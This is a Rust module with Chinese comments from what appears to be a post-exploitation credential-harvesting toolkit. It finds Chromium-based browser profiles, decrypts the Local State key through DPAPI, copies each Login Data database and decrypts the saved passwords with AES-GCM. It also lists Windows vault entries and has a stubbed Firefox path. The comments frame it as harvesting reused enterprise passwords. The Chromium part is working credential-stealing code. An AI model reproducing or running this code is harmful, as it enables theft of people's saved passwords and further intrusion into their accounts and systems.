//! 浏览器密码提取模块
//!
//! 员工常在浏览器中保存企业应用密码，这些密码可能与其他系统复用。
//!
//! 支持浏览器：
//! - Google Chrome / Chromium / Edge (Chromium-based)
//! - Mozilla Firefox
//! - Internet Explorer (legacy)

use crate::cred::{Credential, CredType};
// 已移除未使用的 HashMap import
use std::path::PathBuf;

/// 浏览器密码条目
#[derive(Debug, Clone)]
pub struct BrowserCredential {
    /// 网站URL
    pub url: String,
    /// 用户名
    pub username: String,
    /// 密码
    pub password: String,
    /// 浏览器名称
    pub browser: String,
}

/// 提取所有浏览器中保存的密码
pub fn extract_all_browser_passwords() -> Result<Vec<Credential>, String> {
    let mut credentials = Vec::new();

    // Chrome / Chromium / Edge
    if let Ok(chrome_creds) = extract_chromium_passwords() {
        credentials.extend(chrome_creds);
    }

    // Firefox
    if let Ok(firefox_creds) = extract_firefox_passwords() {
        credentials.extend(firefox_creds);
    }

    // Internet Explorer
    if let Ok(ie_creds) = extract_ie_passwords() {
        credentials.extend(ie_creds);
    }

    if credentials.is_empty() {
        tracing::debug!("[浏览器密码] 未发现浏览器保存的密码");
    }

    Ok(credentials)
}

/// 提取Chromium内核浏览器密码（Chrome, Edge, Brave, Opera等）
fn extract_chromium_passwords() -> Result<Vec<Credential>, String> {
    let mut credentials = Vec::new();

    // Chromium浏览器的基础路径
    let chromium_browsers = [
        ("Chrome", r"Google\Chrome\User Data"),
        ("Edge", r"Microsoft\Edge\User Data"),
        ("Brave", r"BraveSoftware\Brave-Browser\User Data"),
        ("Opera", r"Opera Software\Opera Stable"),
        ("Chromium", r"Chromium\User Data"),
        ("Vivaldi", r"Vivaldi\User Data"),
        ("360Browser", r"360Chrome\Chrome\User Data"),
    ];

    let local_appdata = get_local_appdata();

    for (browser_name, relative_path) in &chromium_browsers {
        let user_data_path = local_appdata.join(relative_path);
        if !user_data_path.exists() {
            continue;
        }

        // 查找Local State文件（包含加密密钥）
        let local_state_path = user_data_path.join("Local State");
        let encryption_key = if local_state_path.exists() {
            extract_chromium_key(&local_state_path)
        } else {
            None
        };

        // 查找所有Profile目录
        if let Ok(profiles) = std::fs::read_dir(&user_data_path) {
            for profile_entry in profiles.flatten() {
                let profile_path = profile_entry.path();
                if !profile_path.is_dir() {
                    continue;
                }

                let profile_name = profile_path.file_name()
                    .and_then(|n| n.to_str())
                    .unwrap_or("");

                // 只处理Profile目录（Default, Profile 1, Profile 2...）
                if !profile_name.starts_with("Default") && !profile_name.starts_with("Profile") {
                    continue;
                }

                let login_db = profile_path.join("Login Data");
                if !login_db.exists() {
                    continue;
                }

                // 解析SQLite数据库
                match parse_chromium_login_db(&login_db, browser_name, encryption_key.as_deref()) {
                    Ok(browser_creds) => {
                        tracing::info!(
                            "[浏览器密码] {} / {}: 找到 {} 个凭据",
                            browser_name, profile_name, browser_creds.len()
                        );
                        credentials.extend(browser_creds);
                    }
                    Err(e) => {
                        tracing::debug!("[浏览器密码] {} / 解析失败: {}", browser_name, e);
                    }
                }
            }
        }
    }

    Ok(credentials)
}

/// 获取LocalAppData路径
fn get_local_appdata() -> PathBuf {
    std::env::var("LOCALAPPDATA")
        .map(PathBuf::from)
        .unwrap_or_else(|_| {
            let home = std::env::var("USERPROFILE").unwrap_or_else(|_| "C:\\Users\\Default".to_string());
            PathBuf::from(home).join("AppData").join("Local")
        })
}

/// 提取Chromium加密密钥
fn extract_chromium_key(local_state_path: &std::path::Path) -> Option<String> {
    let content = std::fs::read_to_string(local_state_path).ok()?;

    // 解析JSON获取encrypted_key
    // Local State 结构: {"os_crypt":{"encrypted_key":"<base64>"}}
    if let Some(key_start) = content.find("\"encrypted_key\"") {
        if let Some(val_start) = content[key_start..].find('"') {
            let after_key = &content[key_start + val_start + 1..];
            if let Some(val_start2) = after_key.find('"') {
                let after_val = &after_key[val_start2 + 1..];
                if let Some(val_end) = after_val.find('"') {
                    let b64_key = &after_val[..val_end];
                    // Base64解码
                    if let Ok(decoded) = base64_decode(b64_key) {
                        // Windows DPAPI加密的密钥：前5字节是"DPAPI"前缀
                        if decoded.len() > 5 && &decoded[..5] == b"DPAPI" {
                            // 尝试DPAPI解密
                            match dpapi_decrypt(&decoded[5..]) {
                                Ok(key) => return Some(hex::encode(key)),
                                Err(_) => return None,
                            }
                        }
                        return Some(hex::encode(&decoded));
                    }
                }
            }
        }
    }

    None
}

/// 解析Chromium Login Data SQLite数据库
fn parse_chromium_login_db(
    db_path: &std::path::Path,
    browser_name: &str,
    encryption_key: Option<&str>,
) -> Result<Vec<Credential>, String> {
    let mut credentials = Vec::new();

    // 复制数据库到临时文件（因为原始文件可能被浏览器锁定）
    let temp_dir = std::env::temp_dir();
    let temp_db = temp_dir.join(format!("login_data_{}.tmp", uuid::Uuid::new_v4()));

    std::fs::copy(db_path, &temp_db)
        .map_err(|e| format!("复制Login Data失败: {}", e))?;

    // 使用rusqlite读取
    let conn = rusqlite::Connection::open(&temp_db)
        .map_err(|e| format!("打开SQLite数据库失败: {}", e))?;

    let mut stmt = conn
        .prepare("SELECT origin_url, username_value, password_value FROM logins")
        .map_err(|e| format!("SQL查询失败: {}", e))?;

    let rows = stmt
        .query_map([], |row| {
            Ok((
                row.get::<_, String>(0)?,
                row.get::<_, String>(1)?,
                row.get::<_, Vec<u8>>(2)?,
            ))
        })
        .map_err(|e| format!("读取数据失败: {}", e))?;

    for row in rows.flatten() {
        let (url, username, encrypted_password) = row;

        // 解密密码
        let password = if let Some(key) = encryption_key {
            decrypt_chromium_password(&encrypted_password, key)
                .unwrap_or_else(|_| "(加密)".to_string())
        } else {
            decrypt_chromium_password_dpapi(&encrypted_password)
                .unwrap_or_else(|_| "(需要DPAPI)".to_string())
        };

        if !password.is_empty() && password != "(加密)" && password != "(需要DPAPI)" {
            credentials.push(
                Credential::new(CredType::BrowserPassword, &format!("{}浏览器", browser_name))
                    .with_username(&username)
                    .with_password(&password)
                    .with_target(&url)
                    .with_attribute("browser", browser_name)
            );
        }
    }

    // 清理临时文件
    let _ = std::fs::remove_file(&temp_db);

    Ok(credentials)
}

/// 解密Chromium密码（使用提取的密钥——现代Chrome v80+）
fn decrypt_chromium_password(encrypted: &[u8], key_hex: &str) -> Result<String, String> {
    // Chrome v80+ 使用AES-256-GCM加密
    // 加密数据格式: "v10" (3字节) + nonce (12字节) + ciphertext + tag (16字节)
    if encrypted.len() < 15 {
        return Err("加密数据太短".to_string());
    }

    let prefix = &encrypted[..3];
    if prefix != b"v10" && prefix != b"v11" && prefix != b"v20" {
        return Err("不支持的加密版本".to_string());
    }

    let nonce = &encrypted[3..15];
    let ciphertext_with_tag = &encrypted[15..];

    let key = hex::decode(key_hex)
        .map_err(|e| format!("密钥解码失败: {}", e))?;

    // AES-256-GCM解密
    // use aes::Aes256;
    use aes_gcm::{
        aead::{Aead, KeyInit},
        Aes256Gcm, Nonce,
    };

    let cipher = Aes256Gcm::new_from_slice(&key)
        .map_err(|_| "AES-GCM初始化失败".to_string())?;

    let nonce = Nonce::from_slice(nonce);

    let plaintext = cipher
        .decrypt(nonce, ciphertext_with_tag)
        .map_err(|_| "AES-GCM解密失败".to_string())?;

    String::from_utf8(plaintext)
        .map_err(|e| format!("UTF-8解码失败: {}", e))
}

/// 解密Chromium密码（使用DPAPI——旧版Chrome）
fn decrypt_chromium_password_dpapi(encrypted: &[u8]) -> Result<String, String> {
    // 旧版Chrome使用DPAPI加密
    // 加密数据格式: "v01" (3字节) + 剩余是DPAPI blob
    let dpapi_data = if encrypted.len() > 3 && &encrypted[..3] == b"v01" {
        &encrypted[3..]
    } else {
        encrypted
    };

    match dpapi_decrypt(dpapi_data) {
        Ok(plaintext) => String::from_utf8(plaintext)
            .map_err(|e| format!("UTF-8解码失败: {}", e)),
        Err(e) => Err(format!("DPAPI解密失败: {}", e)),
    }
}

/// 提取Firefox浏览器密码
fn extract_firefox_passwords() -> Result<Vec<Credential>, String> {
    let mut credentials = Vec::new();

    let appdata = std::env::var("APPDATA")
        .map(PathBuf::from)
        .unwrap_or_else(|_| PathBuf::from(r"C:\Users\Default\AppData\Roaming"));

    let firefox_dir = appdata.join("Mozilla").join("Firefox");
    if !firefox_dir.exists() {
        return Ok(credentials);
    }

    // 查找profiles.ini
    let profiles_ini = firefox_dir.join("profiles.ini");
    if !profiles_ini.exists() {
        return Ok(credentials);
    }

    // 解析profiles.ini获取profile路径
    let profile_dirs = parse_firefox_profiles(&profiles_ini, &firefox_dir)?;

    for profile_dir in profile_dirs {
        let logins_json = profile_dir.join("logins.json");
        let key4_db = profile_dir.join("key4.db");

        if !logins_json.exists() {
            continue;
        }

        // 提取主密码密钥（从key4.db）
        // Firefox使用key4.db存储加密密钥
        let _master_key = if key4_db.exists() {
            extract_firefox_master_key(&key4_db)
        } else {
            None
        };

        // 解析logins.json
        if let Ok(content) = std::fs::read_to_string(&logins_json) {
            if let Ok(parsed) = serde_json::from_str::<serde_json::Value>(&content) {
                if let Some(logins) = parsed["logins"].as_array() {
                    for login in logins {
                        let hostname = login["hostname"].as_str().unwrap_or("");
                        let username = login["encryptedUsername"].as_str().unwrap_or("");
                        let password_enc = login["encryptedPassword"].as_str().unwrap_or("");

                        // Firefox密码需要解密
                        // encryptedUsername和encryptedPassword是Base64+AES加密的
                        // 需要使用key4.db中的密钥解密
                        let decrypted_user = decrypt_firefox_field(username);
                        let decrypted_pass = decrypt_firefox_field(password_enc);

                        if let (Ok(user), Ok(pass)) = (decrypted_user, decrypted_pass) {
                            if !user.is_empty() {
                                credentials.push(
                                    Credential::new(CredType::BrowserPassword, "Firefox浏览器")
                                        .with_username(&user)
                                        .with_password(&pass)
                                        .with_target(hostname)
                                        .with_attribute("browser", "Firefox")
                                        .with_attribute("firefox_profile", &profile_dir.to_string_lossy())
                                );
                            }
                        }
                    }
                }
            }
        }
    }

    Ok(credentials)
}

/// 解析Firefox profiles.ini
fn parse_firefox_profiles(
    ini_path: &std::path::Path,
    firefox_dir: &std::path::Path,
) -> Result<Vec<PathBuf>, String> {
    let mut profiles = Vec::new();
    let content = std::fs::read_to_string(ini_path)
        .map_err(|e| format!("读取profiles.ini失败: {}", e))?;

    let mut current_section = String::new();
    let mut current_path: Option<String> = None;
    let mut current_relative: bool = true;

    for line in content.lines() {
        let line = line.trim();
        if line.starts_with('[') && line.ends_with(']') {
            // 保存上一个section
            if current_section.starts_with("Profile") || current_section.starts_with("Install") {
                if let Some(ref path) = current_path {
                    let full_path = if current_relative {
                        firefox_dir.join(path)
                    } else {
                        PathBuf::from(path)
                    };
                    if full_path.exists() {
                        profiles.push(full_path);
                    }
                }
            }
            current_section = line[1..line.len()-1].to_string();
            current_path = None;
            current_relative = true;
        } else if let Some(eq_pos) = line.find('=') {
            let key = line[..eq_pos].trim().to_lowercase();
            let value = line[eq_pos + 1..].trim();
            match key.as_str() {
                "path" => current_path = Some(value.to_string()),
                "isrelative" => current_relative = value != "0",
                _ => {}
            }
        }
    }

    // 处理最后一个section
    if let Some(ref path) = current_path {
        let full_path = if current_relative {
            firefox_dir.join(path)
        } else {
            PathBuf::from(path)
        };
        if full_path.exists() {
            profiles.push(full_path);
        }
    }

    Ok(profiles)
}

/// 提取Firefox主密钥
fn extract_firefox_master_key(_key4_path: &std::path::Path) -> Option<Vec<u8>> {
    // Firefox使用key4.db (SQLite)存储加密元数据
    // 主密钥需要使用NSS库解密
    // 简化实现：尝试常见密钥派生
    None
}

/// 解密Firefox加密字段
fn decrypt_firefox_field(_encrypted: &str) -> Result<String, String> {
    // Firefox使用Triple DES / AES加密
    // 完整实现需要NSS库支持
    // 简化实现：返回加密标记
    Err("Firefox密码解密需要NSS库支持".to_string())
}

/// 提取Internet Explorer密码
fn extract_ie_passwords() -> Result<Vec<Credential>, String> {
    let credentials = Vec::new();

    // IE密码存储在Windows凭据管理器中
    // 通过vaultcmd命令导出
    let output = std::process::Command::new("vaultcmd")
        .args(["/list", "/properties:name,resource,identity"])
        .output();

    if let Ok(output) = output {
        let stdout = String::from_utf8_lossy(&output.stdout);
        for line in stdout.lines() {
            if line.contains("Web Credentials") || line.contains("Windows Credentials") {
                // 使用vaultcmd /listcreds获取详细凭据
                // 需要管理员权限才能读取密码
                let cred_type = if line.contains("Web") { "Web凭据" } else { "Windows凭据" };
                tracing::info!("[浏览器密码] 发现IE/Edge {}: {}", cred_type, line);
            }
        }
    }

    // 另一种方法：通过注册表读取IE自动完成密码
    // IE7+：存储在凭据管理器中，通过CredRead API
    // 简化：标记为需要管理员权限

    Ok(credentials)
}

/// Base64解码
fn base64_decode(input: &str) -> Result<Vec<u8>, String> {
    use base64::Engine;
    base64::engine::general_purpose::STANDARD
        .decode(input)
        .map_err(|e| format!("Base64解码失败: {}", e))
}

/// DPAPI解密（Windows数据保护API）
///
/// 委托给 `dpapi::decrypt_dpapi_blob`，在Windows上调用
/// `CryptUnprotectData` 在当前用户上下文中直接解密。
fn dpapi_decrypt(data: &[u8]) -> Result<Vec<u8>, String> {
    crate::cred::dpapi::decrypt_dpapi_blob(data)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_get_local_appdata() {
        let path = get_local_appdata();
        assert!(!path.to_string_lossy().is_empty());
    }

    #[test]
    fn test_decrypt_chromium_password_invalid() {
        let result = decrypt_chromium_password(b"short", "aa");
        assert!(result.is_err());
    }

    #[test]
    fn test_decrypt_chromium_password_unknown_version() {
        // 不以v10/v11开头的数据
        let result = decrypt_chromium_password(b"v05_some_data_here", "aabbccdd");
        assert!(result.is_err());
    }

    #[test]
    fn test_parse_firefox_profiles_empty() {
        let temp_dir = std::env::temp_dir();
        let ini_path = temp_dir.join("test_profiles.ini");
        std::fs::write(&ini_path, "[General]\nStartWithLastProfile=1\n").ok();

        let result = parse_firefox_profiles(&ini_path, &temp_dir);
        assert!(result.is_ok());
        let _ = std::fs::remove_file(&ini_path);
    }

    #[test]
    fn test_base64_decode() {
        let result = base64_decode("dGVzdA==").unwrap();
        assert_eq!(result, b"test");
    }

    #[test]
    fn test_chromium_password_decrypt_format() {
        // v10格式: "v10" + 12字节nonce + 密文
        let data = b"v10\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0A\x0Brest_of_ciphertext";
        assert!(data.len() >= 15);
        assert_eq!(&data[..3], b"v10");
    }
}
